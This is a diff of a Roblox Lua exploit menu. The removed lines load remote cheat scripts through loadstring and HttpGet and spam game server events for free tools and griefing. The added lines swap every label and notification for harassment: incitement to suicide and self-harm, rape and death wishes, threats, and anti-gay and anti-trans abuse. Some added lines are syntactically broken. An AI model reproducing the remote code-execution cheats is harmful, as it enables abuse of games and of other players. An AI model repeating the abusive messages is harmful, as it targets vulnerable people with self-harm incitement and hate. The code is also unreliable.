@@ -1,206 +1,156 @@
 local OrionLib = loadstring(game:HttpGet(('https://raw.githubusercontent.com/shlexware/Orion/main/source')))()
 local Window = OrionLib:MakeWindow({Name = "Cool scripts I use", HidePremium = false, SaveConfig = true, ConfigFolder = "OrionTest"})
 local Tab = Window:MakeTab({
-	Name = "Mostly Universal",
+	Name = "you're the reason people are homophobic",
 	Icon = "rbxassetid://4483345998",
 	PremiumOnly = false
 })
 Tab:AddButton({
-	Name = "Domain X",
+	Name = "go kill yourself you whore",
 	Callback = function()
     OrionLib:MakeNotification({
-	Name = "Title!",
-	Content = "Loading Domain X...",
+	Name = "go hang yourself",
+	Content = "go kill yourself you whore",
 	Image = "rbxassetid://4483345998",
-	Time = 5
+	Time = 20
 })
-    loadstring(game:HttpGet(('https://shlex.dev/release/domainx/latest.lua'),true))()
+    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(1, 10000000000000000000000000, 1)
   	end    
 })
 Tab:AddButton({
-	Name = "Infinite Yield",
+	Name = "kill yourself",
 	Callback = function()
     OrionLib:MakeNotification({
-	Name = "Title!",
-	Content = "Loading Infinite Yield",
+	Name = "go get beaten by your parents",
+	Content = "have a seizure you whore",
 	Image = "rbxassetid://4483345998",
-	Time = 5
+	Time = 20
 })
-    loadstring(game:HttpGet('https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source'))()
   	end    
 })
 Tab:AddButton({
-	Name = "Fates Admin",
+	Name = "kys you trans mocker",
 	Callback = function()
     OrionLib:MakeNotification({
-	Name = "Title!",
-	Content = "Loading Fates Admin...",
+	Name = "go to jail for liking little boys",
+	Content = "go step in front of a bus",
 	Image = "rbxassetid://4483345998",
-	Time = 5
+	Time = 20
 })
-    loadstring(game:HttpGet("https://raw.githubusercontent.com/fatesc/fates-admin/main/main.lua"))();
   	end    
 })
 Tab:AddButton({
-	Name = "Backdoor Finder",
+	Name = "your father and mother should beat you to death",
 	Callback = function()
-   loadstring(game:HttpGet(('https://raw.githubusercontent.com/iK4oS/backdoor.exe/master/source.lua'),true))()
 	end 
 }) 
 Tab:AddButton({
-	Name = "No cooldown (press no cooldown)",
+	Name = "you should be in jail",
 	Callback = function()
     OrionLib:MakeNotification({
-	Name = "Title!",
-	Content = "Loading No Cooldown Gui (may work also for ABD)",
+	Name = "you are worthless",
+	Content = "i hope your brother rapes you",
 	Image = "rbxassetid://4483345998",
-	Time = 5
+	Time = 20
 })
-    loadstring(game:HttpGet("https://raw.githubusercontent.com/Moddi69/Script/master/ABizarreMod", true))()
   	end    
 })
 Tab:AddButton({
-	Name = "Nullware Hub",
+	Name = "I hope you become homeless",
 	Callback = function()
     OrionLib:MakeNotification({
-	Name = "Title!",
-	Content = "Loading Nullware (your screen will freeze)",
+	Name = "your broke self should go shoot yourself",
+	Content = "you're worthless and should be erased from the earth",
 	Image = "rbxassetid://4483345998",
-	Time = 5
+	Time = 20
 })
-wait(3)
-    getgenv().Theme = "Blue" -- To change the UI Theme, set this to one of the following options: "Red", "Purple", "Blue", "Green", "Yellow"
-loadstring(game:HttpGet("https://gist.githubusercontent.com/M6HqVBcddw2qaN4s/2d722888a388017c18028cd434c43a25/raw/dcccf1027fe4b90780e47767aaf584389c9d7771/EULma3fU90PUOKUn?identifier=".. (function()local a=""for b=1,256 do local c=math.random(1,3)a=a..string.char(c==1 and math.random(48,57)or c==2 and math.random(97,122)or c==3 and math.random(65,90))end;return a end)()))()
   	end    
 })
 Tab:AddButton({
-	Name = "Owlhub",
+	Name = "I hoped you get kidnapped and raped",
 	Callback = function()
-      	loadstring(game:HttpGet("https://raw.githubusercontent.com/CriShoux/OwlHub/master/OwlHub.txt"))();
   	end    
 })
 
 Tab:AddButton({
-	Name = "Insult Hub",
+	Name = "you should be banned from the internet and real life",
 	Callback = function()
     OrionLib:MakeNotification({
-	Name = "Title!",
-	Content = "Loading Insult Hub",
+	Name = "heck is the only place you belong",
+	Content = "you can't run",
 	Image = "rbxassetid://4483345998",
-	Time = 5
+	Time = 20
 })
-    loadstring(game:HttpGet('https://raw.githubusercontent.com/yeerma/such/main/bing%20bong.txt'))()
   	end    
 })
 Tab:AddButton({
-	Name = "Anti Afk",
+	Name = "we are watching",
 	Callback = function()
     OrionLib:MakeNotification({
-	Name = "Title!",
-	Content = "Anti Afk Loaded!",
+	Name = "go slit your throat",
+	Content = "you can't trust your own friends",
 	Image = "rbxassetid://4483345998",
-	Time = 10
+	Time = 20
 })
-    for i,v in pairs(getconnections(game.Players.LocalPlayer.Idled)) do
-v:Disable()
-end
   	end    
 })
 local Tab = Window:MakeTab({
-	Name = "Rate my avatar",
+	Name = "rate your death scene",
 	Icon = "rbxassetid://6510491739",
 	PremiumOnly = false
 })
 Tab:AddButton({
-	Name = "Get stop signs rate my avatar (NEED GAMEPASS)",
+	Name = "I hope you drown in pee",
 	Callback = function()
-      	while true do
-wait (0)
-local args = {
-    [1] = 17290248
-}
-
-game:GetService("ReplicatedStorage").RequestGamepassTool:FireServer(unpack(args))
-end
   	end    
 })
 Tab:AddButton({
-	Name = "Get swords rate my avatar (NEED KNIGHT ROLE)",
+	Name = "go drink bleach and acid",
 	Callback = function()
-      	while true do
-wait (0) 
-local args = {
-    [1] = "ClassicSword"
-}
-
-game:GetService("ReplicatedStorage").RequestTool:FireServer(unpack(args))
-end
   	end    
 })
 Tab:AddButton({
-	Name = "Get text signs (NEED GAMEPASS)",
+	Name = "you should be beaten and fed to your dogs",
 	Callback = function()
-      	local args = {
-    [1] = 17291420
-}
-
-game:GetService("ReplicatedStorage").RequestGamepassTool:FireServer(unpack(args))
-  	end    
-})
 Tab:AddButton({
-	Name = "Get Image Signs (NEED GAMEPASS)",
+	Name = "I hope your house gets lit on fire",
 	Callback = function()
-      	while true do
-wait(0)
-local args = {
-    [1] = 17291427
-}
-
-game:GetService("ReplicatedStorage").RequestGamepassTool:FireServer(unpack(args))
 end 
   	end    
 })
 Tab:AddButton({
-	Name = "Rick Roll booth",
+	Name = "go get gang banged by your family",
 	Callback = function()
-      	loadstring(game:HttpGet("https://raw.githubusercontent.com/typical-overk1ll/scripts/main/RateMyAvatarRickRoll", true))()
   	end    
 })
 Tab:AddButton({
-	Name = "Rate everyone 1",
+	Name = "you should constantly go through suffering",
 	Callback = function()
-      	for i,v in pairs(game.Players:GetPlayers()) do
-   if v.Name ~= game.Players.LocalPlayer.Name then
-       game:GetService("ReplicatedStorage").PostRating:FireServer(v, 1)
-   end
-end
   	end    
 })
 Tab:AddButton({
-	Name = "RMA hub",
+	Name = "I hope you get kidnapped and raped and put on a pornhub video",
 	Callback = function()
-      	loadstring(game:HttpGet("https://raw.githubusercontent.com/tresks/RAS/main/Rate%20My%20Shitter.lua"))()
   	end    
 })
 local Tab = Window:MakeTab({
-	Name = "Booga Booga",
+	Name = "go play mcnut simulator irl
 	Icon = "rbxassetid://4483345998",
 	PremiumOnly = false
 })
 Tab:AddButton({
-	Name = "Warrior Hub (Can be universal and probably has other games)",
+	Name = "go pull some real men you ugly moron",
 	Callback = function()
       	OrionLib:MakeNotification({
-	Name = "Butter's Gui",
-	Content = "Loading Warrior Hub!",
+	Name = "go shoot yourself in the face
+	Content = "I hope your dogs eat you",
 	Image = "rbxassetid://4483345998",
-	Time = 5
+	Time = 20
 })
-	loadstring(game:HttpGet("https://raw.githubusercontent.com/WarriorCrystal/WarriorHub/main/Load.lua"))()
   	end    
 })
 local Tab = Window:MakeTab({
-	Name = "Bedwars",
+	Name = "you should be beaten with a baseball bat",
 	Icon = "rbxassetid://4483345998",
 	PremiumOnly = false
 })
@@ -208,28 +158,26 @@ Tab:AddButton({
 	Name = "Vape V4",
 	Callback = function()
       	OrionLib:MakeNotification({
-	Name = "balls",
-	Content = "Loading Vape...",
+	Name = "you're flat, ugly, and stupid",
+	Content = "you're a burden to this world",
 	Image = "rbxassetid://4483345998",
-	Time = 5
+	Time = 20
 })
-loadstring(game:HttpGet("https://raw.githubusercontent.com/7GrandDadPGN/VapeV4ForRoblox/main/NewMainScript.lua", true))()
   	end    
 })
 local Tab = Window:MakeTab({
-	Name = "Work at a pizza place",
+	Name = "you act sad for sympathy
 	Icon = "rbxassetid://4483345998",
 	PremiumOnly = false
 })
 local Tab = Window:MakeTab({
-	Name = "Ragdoll Engine",
+	Name = "cut yourself",
 	Icon = "rbxassetid://4483345998",
 	PremiumOnly = false
 })
 Tab:AddButton({
-	Name = "Cryptonic Hub (also is for da hood)",
+	Name = "you try to pull fictional characters that don't like you back",
 	Callback = function()
-      	loadstring(game:HttpGet('https://raw.githubusercontent.com/martinelcrac/cryptonichub/main/Ragdollengine.lua'))()
   	end    
 })
 OrionLib:Destroy()
